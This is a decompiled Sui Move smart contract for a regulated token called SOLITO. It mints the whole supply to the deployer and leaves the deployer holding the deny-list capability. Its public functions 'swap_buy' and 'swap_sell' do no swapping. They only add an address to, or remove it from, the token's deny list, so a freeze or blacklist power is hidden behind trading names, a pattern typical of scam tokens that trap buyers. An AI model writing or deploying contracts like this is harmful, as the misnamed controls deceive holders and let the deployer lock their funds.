module 0x51ae831970a7965ea5395e423ab3478b7d88190bad259f98fd36d19306e954e::solito {
    struct SOLITO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SOLITO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SOLITO>(arg0, 9, b"SOLITO", b"SOLITO", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPeiAGcs7NzVVZoUHpSjUPYckFJnsaUGRANpQ3Uap5TiL"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SOLITO>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SOLITO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SOLITO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SOLITO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOLITO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SOLITO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOLITO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SOLITO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

